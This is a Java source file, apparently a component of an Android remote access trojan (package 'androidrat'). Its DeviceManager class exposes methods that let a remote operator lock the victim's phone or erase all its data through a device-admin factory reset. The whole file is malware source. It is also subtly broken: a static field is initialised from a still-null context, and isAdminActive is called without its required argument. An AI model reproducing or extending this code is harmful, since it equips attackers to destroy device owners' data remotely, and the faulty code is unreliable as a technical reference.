package com.ot.androidrat;

import android.annotation.SuppressLint;
import android.app.Application;
import android.app.admin.DevicePolicyManager;
import android.content.Context;

public class DeviceManager {

    @SuppressLint("StaticFieldLeak")
    static Context context;
    static DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    DeviceManager(Context context){
        DeviceManager.context = context;
    }

    public static void wipeDevice(){
        if (isAdminActive()) {
            dpm.wipeData(0);
        }
    }

    public static void lockDevice(){
        dpm.lockNow();
    }

    private static boolean isAdminActive(){
        return dpm.isAdminActive();
    }
}
